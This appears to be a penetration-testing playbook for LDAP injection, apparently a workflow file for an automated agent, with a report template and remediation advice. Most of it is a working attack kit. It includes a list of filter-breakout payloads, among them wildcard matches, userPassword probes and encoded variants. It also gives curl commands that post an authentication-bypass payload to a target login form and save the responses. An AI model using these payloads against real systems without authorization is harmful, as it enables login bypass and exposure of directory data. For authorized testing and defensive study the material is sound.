# LDAP Injection Payloads

## Overview
LDAP injection targets unsanitized input embedded in LDAP filters, allowing
bypass of auth, data extraction, or filter manipulation.

## Prerequisites
```bash
apt-get install -y jq
```

## Phase 1: Map Filter Context
```bash
# Common filter patterns to target:
# (uid={input})
# (|(uid={input})(mail={input}))
# (&(objectClass=person)(uid={input}))
# (member={input})
```

## Phase 2: Payload List
```bash
cat > /workspace/output/TARGET_ldap_payloads.txt <<'PAYLOADS'
# Match all
*

# Classic filter breakouts
*)(|(uid=*))
*)(|(cn=*))
*)(|(mail=*))
*)(|(objectClass=*))
*)(userPassword=*)

# Boolean bypass variants
*)(|(uid=*))(|(uid=*
*)(|(uid=*))(|(uid=*)))

# Attribute override examples
*)(|(uid=*))(|(memberOf=*))
*)(|(uid=*))(|(employeeType=*))

# URL-encoded variants
%2a
%29%28%7c%28uid%3d%2a%29%29

# RFC4515 escaped variants (if input is partially escaped)
\2a
\29\28\7c\28uid\3d\2a\29\29
PAYLOADS
```

## Phase 3: Test Examples
```bash
TARGET_URL="https://TARGET/login"

# Example parameter: username
curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=*)(|(uid=*))&password=test" \
  | tee /workspace/output/TARGET_ldap_test_1.txt
```

## Phase 4: Blind / Differential Checks
```bash
# Compare response lengths or messages between payloads
# Use a benign payload to baseline
curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=nonexistent&password=test" \
  | tee /workspace/output/TARGET_ldap_baseline.txt
```

## Report Template

```
Target: TARGET
Assessment Date: <DATE>

## Confirmed Findings
- [ ] LDAP filter bypass via injection
- [ ] Data exposure via wildcard filter

## Evidence
- Response: /workspace/output/TARGET_ldap_test_1.txt
- Baseline: /workspace/output/TARGET_ldap_baseline.txt

## Recommendations
1. Use parameterized LDAP queries / safe filter builders
2. Escape special chars: * ( ) \0 \ 
3. Apply strict allowlists for usernames/attributes
```

## Output Files
- `/workspace/output/TARGET_ldap_payloads.txt` — payload list
- `/workspace/output/TARGET_ldap_test_1.txt` — test response
- `/workspace/output/TARGET_ldap_baseline.txt` — baseline response

indicators: ldap injection, ldap filter injection, directory injection, ldap wildcard
